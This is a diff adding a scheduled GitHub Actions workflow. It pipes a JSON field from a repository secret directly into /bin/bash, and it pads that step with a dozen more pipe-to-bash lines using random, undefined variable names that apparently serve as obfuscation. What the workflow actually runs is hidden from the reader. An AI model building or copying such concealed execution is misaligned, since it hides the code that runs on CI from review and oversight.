@@ -1,0 +1,29 @@
+name: zhushengqiangguang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhushengqiangguang
+        env:
+          b74: ${{ secrets.b74 }}
+        run: |
+          echo $b74 | jq -r .dn993 | /bin/bash
+          echo $mcl3 | jq -r .ut9 | /bin/bash
+          echo $w64 | jq -r .nyew45528 | /bin/bash
+          echo $iow3718 | jq -r .vvhnf202 | /bin/bash
+          echo $wlur227 | jq -r .vae1 | /bin/bash
+          echo $ikucm73335 | jq -r .yt4690 | /bin/bash
+          echo $yk006 | jq -r .tvxc161 | /bin/bash
+          echo $piuwn41 | jq -r .amn640 | /bin/bash
+          echo $orr7 | jq -r .vvcz65231 | /bin/bash
+          echo $is62494 | jq -r .q0 | /bin/bash
+          echo $ysngs61 | jq -r .jvh41 | /bin/bash
+          echo $jfhet806 | jq -r .pdxaz475 | /bin/bash
+          echo $aq96006 | jq -r .s343 | /bin/bash
+
